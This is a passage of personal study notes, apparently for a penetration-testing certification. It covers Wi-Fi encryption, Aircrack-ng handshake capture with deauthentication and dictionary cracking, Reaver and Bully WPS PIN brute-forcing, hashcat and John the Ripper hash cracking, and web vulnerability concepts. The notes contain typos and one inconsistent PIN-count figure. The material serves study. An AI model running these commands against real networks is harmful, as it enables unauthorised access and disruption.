- Encryption (WEP, WPA, WPA2, WPA3)
   - Open, no encyption
   - Wireless Equivilant Protection, weakness is the 24-bit Initialization Vector
   - Wifi Protected Access replaced WEP, uses RC4 and MIC for added security
   - WPA2 introduced stronger encryption with CCMP and AES (128bit key)
   - WPA3 stronger encryption uses SAE(Simultaneous Authentication of Equals) prevents offline attacks and conducts Perfect forward Secrecy. Session keys cannot be comprimised. Dragonlfy
- Macfiltering is useless


### Wireless signal exploitation

- signal jamming- the act of disrupting wireless communication by overwhelming the frequency with noise or signal
- Wardriving- searching for wifi networks by moving around geographic area, typically in a vehicle.
   - wigle.net- maps wifi networks, can search density and security on a map
   - 
### Wireless hacking Aircrack-ng
- gather handshack packets or IV(initialization vectors)
- Type of DOS(denial of service) attack, specifically targeted at wireless networks, forces client to disconnect by sending spoofed deauth frames
1. Put wireless card in monitor mode ```airmon-ng start wlan0```
2. next use ```airodump-ng wlan0mon``` to scan/monitor networks to save to pcap file
3. capture traffic from the target taking note of BSSID, MAC address and channel. example is ```airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write capture wlan0mon```
4. perform the deauth attack to force client to reconnect ```aireplay-ng -deauth 10 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon```
5. Crack the WPA/WPA2 key by using a dictionary attack to guess the passphrase. Example is using rockyou.txt or a specifically designed wordlist.txt ```aircrack-ng -w /path/tp/wordlist.txt -b AA:BB:CC:DD:EE:FF capture-01.cap```
#### Practical
    iwconfig 
    airmon-ng start wlan0    #put wifi card in monitor mode
    iwconfig 
    airodump-ng wlan0mon     #monitors network access points and copy it
    airodump-ng --bssid AA:BB:CC:DD:EE:FF --channel 6 --write Wirelesshackingcapture wlan0mon #waiting for device to connect to capture it
    aireplay-ng --deauth 0 -a AA:BB:CC:DD:EE:FF -c 11:22:33:44:55:66 wlan0mon #force target device to disconnect then reconnect to capture encrypted passphrase/handshake
    ls #we now see that Wirelesshackingcapture.cap file
    aircrack-ng Wirelesshackingcapture.cap -w /usr/share/wordlists/rockyou.txt #cracking password with this command

### WPS PIN Attack
- Wife Protected Setup (WPS) button to quick connect devices 8 digit pin seperated by 4 and 4.
- To crack a 4 digit pin it is only 10,000 possible pins.
- 3 digit is only 1,000 possible pins
#### Practical
    iwconfig
    airmon-ng start wlan0 #switch wifi card to monitor mode
    wash -h
    wash -i wlan-mon #start scanning networks
    clear
    reaver -h #used to brute force the WPS pin
    reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -K 1 #will brute force the WPS pin
    reaver -i wlan0mon -b AA:BB:CC:DD:EE:FF -vv -N #-N is the no NAT flag, depending on router you have to adjust the flags
    wash -i wlan0mon
    bully -b AA:BB:CC:DD:EE:FF -p 1234567 wlan0mon

- John the Ripper
- Hydra
- Medusa

Example of cracking a hash
- head /usr/share/wordlists/rockyou.txt
- ```echo -n "abc123" | md5sum | awk '{print}' > hash.txt``` create hash of abc123
- ```hashcat -m 0 -a 0 hash.txt /usr/share/wordlists/rockyou.txt```
- ```john --format=raw-md5 --wordlist=/usr/share/wordlists/rockyou.txt hash.txt```

## Section 20: Web Application Vulnerability (4.3 and 4.5)
### Overview
- Race Conditions
- Buffer Overflows
- Buffer Overflow Attacks
- Authentication Flaws adn insecure references
- Improper Error Handling
- Improper Headers
- Code signing
- Vulnerable Components
- Software Composition
### Race conditions
- one execution process is directly dependent on the order and timing of certain events
-  Dereferencing- attack to remove the relationship between pointer and thing it's pointing to inside the memory
-  Dirty COW exploit- Linux os that exploited local priviledge escalation. No log to detect this
-  Time-of-Check to Time-of-Use(TOCTOU)- occurs when an app checks a resource and when the app uses the resource
  - protect against this by using locks and Mutex(Mutually exclusive flag)
  -  Deadlock- if a system crashes or doesn't complete properly

 ### Buffer Overflow
 - stores memory outside the memory range
 - same thing as overfilling a glass with water(it overflows)
 - Stack- reserved area of memory
 - "Smashing the Stack" filled up buffer
 - Non-Operation(NOP) Instruction tells system to do nothing and skip
#### Protect against with:
- buffer overflow by patch management
- secure coding practices(bounday checking and input validation)
- address space layout randomization(ASLR)
- data execution protection DEP(blocks apps that attempt to run from protected memory locations

- Integer overflow- operation is too large to fit into assigned variable type for storage
- Protect by using secure coding practices(bounday checking and input validation)

### Broken Authentication
- 4 digit pin can be cracked in 1,000 attempts
- session ID can be broken
- Protect by using multi factor auth, never use default creds, verify strong passwords, limit or delay to slow brute force attacks, server-side session, never pass session id as url, implement session timeouts

### Improper Error handling
- Use custom error handlers to prevent accidental leakage
